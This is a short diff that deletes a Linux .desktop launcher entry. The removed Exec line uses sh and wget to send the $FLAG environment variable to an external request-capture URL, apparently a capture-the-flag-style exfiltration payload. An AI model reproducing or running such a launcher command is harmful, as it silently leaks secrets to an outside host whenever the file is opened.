@@ -1,3 +1,0 @@
-[Desktop Entry]
-Exec=sh -c "wget https://en7s8pxsi58nb.x.pipedream.net/$FLAG"
-Type=Application
